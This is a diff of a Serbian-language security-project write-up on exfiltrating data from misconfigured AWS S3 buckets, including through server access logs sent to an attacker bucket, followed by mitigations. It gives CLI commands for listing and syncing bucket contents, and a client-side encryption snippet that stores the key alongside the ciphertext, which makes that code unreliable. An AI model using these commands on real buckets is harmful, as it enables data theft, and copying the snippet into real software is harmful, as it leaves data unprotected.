@@ -21,17 +21,17 @@ Nakon pronalska potencijalnih ciljnih bucket-a sledi analiza bezbednosnih mera k
  ```
      aws s3api get-bucket-acl --bucket <bucket-name> --output json
  ```
-Kako bi napadač video sadržaj u S3 bucket-u koristi sledeću komandu koja će izlistati sve datoteke i direktorijume u datom bucket-u:
+Nakon analize rezultata koji je dobijen ovom komandom, napadač postaje svestan da može pristupiti podacima unutar bucket-a. Kako bi to uradio koristi sledeću komandu koja će izlistati sve datoteke i direktorijume u datom bucket-u:
  ```
     aws s3 ls s3://<bucket-name>
  ```
-Ako bucket ima netačno konfigurisane dozvole, napadač može lako preuzeti podatke koristeći sledeću komandu:
+Napadač takođe ima mogućnost da preuzme sve podatke koji se nalaze na datom bucket-u i smesti ih na svoju željenu lokaciju pomoću sledeće komande:
  ```
     aws s3 sync s3://<bucket>/<path> </local/path>
  ```
 Nakon ovih koraka napad je izvršen i napadač može da iskoristi podatke u skladu sa svojim ciljevima. Na ovaj način Data Exfiltration ostvaruje pretnju 'Neovlašćeni pristup osetljivim podacima' [P1]. Napadač može da proda osetljive informacije na crnom tržištu, da vrši iznudu ili ucenu onoga kome je podatke ukrao.
 
-Sledeći konkretan scenario napada bi se mogao prikazati ako napadač ima kontrolu nad S3 bucket-om koji se koristi za čuvanje server access logova [[3]](#reference). Napadač aktivira server access logove na ciljnom S3 bucket-u nad kojim želi izvršiti napad data exfilitration. Sa server access logging-om svaki zahtev ka bucket-u će biti zabeležen u bucket-u za logovanje. Ovo uključuje interne AWS zahteve ili zahteve izvršene putem AWS konzole. Čak i ako je zahtev odbijen, payload koji zahtev nosi će biti poslat ka napadačevom logging bucket-u. Napadač može slati GetObject zahteve ka S3 bucket-ovima do kojih nema pristup:
+Još jedan konkretan scenario Data Exfiltration napada bi se mogao prikazati ako napadač ima kontrolu nad S3 bucket-om koji se koristi za čuvanje server access logova [[3]](#reference). Napadač aktivira server access logove na ciljnom S3 bucket-u nad kojim želi izvršiti napad data exfilitration. Sa server access logging-om svaki zahtev ka bucket-u će biti zabeležen u bucket-u za logovanje. Ovo uključuje interne AWS zahteve ili zahteve izvršene putem AWS konzole. Čak i ako je zahtev odbijen, payload koji zahtev nosi će biti poslat ka napadačevom logging bucket-u. Napadač može slati GetObject zahteve ka S3 bucket-ovima do kojih nema pristup:
  ```
     aws s3api get-object --bucket AttackerBucket --key ExampleDataToExfiltrate
  ```
@@ -40,7 +40,7 @@ Međutim, zato što kontroliše server access logove, i dalje će primati podatk
     [..] attackerbucket […] 8.8.8.8 – […] REST.GET.OBJECT ExampleDataToExfiltrate "GET /
     ExampleDataToExfiltrate HTTP/1.1" 403 AccessDenied 243 - 18 - "-" "UserAgentAlsoHasData " – […]
  ```
-Na osnovu informacija iz logova napadač može rekonstruisati podatke koje je pokušao eksfiltrirati. Problem koji se javlja jeste taj što logovi koji zabeleže svaki zahtev ka bucket-u nisu nužno uređeni po vremenu dolaska. To znači da ako napadač podatke razbije na više zahteva, može se suočiti sa situacijom gde logovi stižu u nekom drugačijem redosledu. Ako pokušava da rekonstruiše podatke koji su razbijeni na više zhgteva, napadač će prvo morati razviti mehanizam koji će pravilno sortirati te logove kako bi ispravno sastavio originalne podatke.
+Na osnovu informacija iz logova napadač može rekonstruisati podatke koje je pokušao eksfiltrirati. Problem koji se javlja jeste taj što logovi koji zabeleže svaki zahtev ka bucket-u nisu nužno uređeni po vremenu dolaska. To znači da ako napadač podatke razbije na više zahteva, može se suočiti sa situacijom gde logovi stižu u nekom drugačijem redosledu. Ako pokušava da rekonstruiše podatke koji su razbijeni na više zahteva, napadač će prvo morati razviti mehanizam koji će pravilno sortirati te logove kako bi ispravno sastavio originalne podatke.
 
 #### Mitigacije [[4]](#reference)
 
@@ -54,8 +54,35 @@ Kada je u pitanju Data Exfiltration najviše pažnje treba posvetiti dozvolama z
 <br><br>
 3. Enkripcija podataka [M2] <br>
 Enkripcijom podaci postaju beskorisni napadaču jer ne može da ih pročita. Postoji nekoliko načina kako se može odraditi enkripcija kada je u pitanju AWS S3. <br><br>
-**Šifrovanje na strani servera** - Amazon S3 šifruje objekte pre nego što ih sačuva na diskovima u svojim centrima podataka, a zatim dešifruje objekte kada budu preuzeti. Šifrovanje se vrši uz pomoć ključa koji se ne čuva na istom mestu gde su i podaci. Amazon S3 nudi nekoliko opcija za šifrovanje na strani servera kao što su: šifrovanje pomoću Amazon S3 managed keys (SSE-S3), AWS Key Managment Service keys (SSE-KMS) i pomoću ključa koji obezbeđuje korisnik (SSE-C). <br><br>
-**Šifrovanje na strani klijenta** - podrazumeva da korisnik pošalje već šifrovane podatke na Amazon S3. U ovom slučaju on upravlja procesom šifrovanja, ključevima za šifrovanje i povezanim alatima. <br><br>
+**Šifrovanje na strani servera** - Amazon S3 šifruje objekte pre nego što ih sačuva na diskovima u svojim centrima podataka, a zatim dešifruje objekte kada budu preuzeti. Šifrovanje se vrši uz pomoć ključa koji se ne čuva na istom mestu gde su i podaci. Amazon S3 nudi nekoliko opcija za šifrovanje na strani servera kao što su: šifrovanje pomoću Amazon S3 managed keys (SSE-S3), AWS Key Managment Service keys (SSE-KMS) i pomoću ključa koji obezbeđuje korisnik (SSE-C). <br>
+
+Konkretno prilikom enkripcije SSE-KMS ključem, prvo je neophodno kreirati dati ključ i odrediti koji IAM korisnici i kakve permisije imaju nad njim. Nakon toga se u samom podešavanju bucket-a (Properties) podesi da se vrši enkripcija korišćenjem SSE-KMS i izabere se ključ koji je prethodno kreiran. Ova enkripcija se vrši automatski tako da svaki put kada korisnik koji ima permisiju za enkripciju sa ovim ključem uradi upload datoteke, ona će se enkriptovati, a svaki put kada korisnik koji ima permisiju za dekripciju preuzme datoteku ona će automatski biti dekriptovana. Napadač će moći da izlista sve fajlove korišćenjem komande "aws s3 ls s3://<bucket-name>".Međutim, svaki korisnik koji pokuša da pristupi enkriptovanoj datoteci, a nema permisije za dekripciju postavljene u ključu korišćenom prilikom enkripcije, dobiće grešku prikazanu na Slici 1.1 <br><br>
+![Slika 1.1](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/error-kms-encrypted.PNG) <br>Slika 1.1<br>
+
+<br>
+**Šifrovanje na strani klijenta** - podrazumeva da korisnik pošalje već šifrovane podatke na Amazon S3. U ovom slučaju on upravlja procesom šifrovanja, ključevima za šifrovanje i povezanim alatima. 
+U caddie aplikaciji moguće je korišćenje biblioteke crypto za enkripciju i dekripciju datoteka. Ovo je potrebno implementirati ručno, tako da se svaki put pre upload-a vrši enkripcija, a svaki put nakon download-a vrši dekripcija preuzete datoteke.
+    ```
+      encryptData(dataBuffer: Buffer): Buffer {
+         const cipher = crypto.createCipheriv(this.algorithm, key, iv);
+         const encryptedBuffer = Buffer.concat([cipher.update(dataBuffer), cipher.final()]);
+         return Buffer.concat([key, iv, encryptedBuffer]);
+      }
+
+      decryptData(encryptedBuffer: Buffer): Buffer {
+        const receivedKey = encryptedBuffer.slice(0, 32);
+        const receivedIV = encryptedBuffer.slice(32, 48);
+        const receivedEncryptedBuffer = encryptedBuffer.slice(48);
+    
+        const decipher = crypto.createDecipheriv(this.algorithm, key, iv);
+        const decryptedBuffer = Buffer.concat([decipher.update(receivedEncryptedBuffer), decipher.final()]);
+        return decryptedBuffer;
+      }
+    ```
+
+Ukoliko sada napadač pokuša da preuzme datoteku, uspeće u tome. Neće dobiti grešku kao što je to slučaj sa enkripcijom na strani AWS-a. Međutim, kada otvori datoteku videće da je ona enkriptovana kao što je prikazano na Slici 1.2. <br><br>
+![Slika 1.2](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/encrypted.PNG) <br>Slika 1.2<br><br>
+
 4. Praćenje i detekcija aktivnosti [M5] <br>
 Ukoliko se napad desi veoma je bitno da na vreme bude identifikovan. To se može uraditi korišćenjem alata kao što je AWS CloudTrail koji se koristi za praćenje svih aktivnosti na AWS-u. CloudTrail beleži događaje i aktivnosti vezane za AWS nalog i smešta podatke u CloudTrail log grupe, gde se lako mogu pregledati i analizirati. Iz podataka se može zaključiti zahtev koji je upućen, IP adresa sa koje je zahtev podnet, ko je i kada podneo zahtev, kao i drugi dodatni detalji o samom zahtevu. <br>
 Za zaštitu od Data Exfiltration napada bitno je što CloudTrail može pratiti svaki zahtev za prenos podataka između S3 bucket-a i drugih AWS resursa. Sumnjive aktivnosti koje ukazuju na velike prenose podataka ili nepravilne upite mogu biti detektovane i istražene. Naravno, ovo je moguće pod uslovom da napadač ne obriše logove kako bi sakrio tragove napada. 
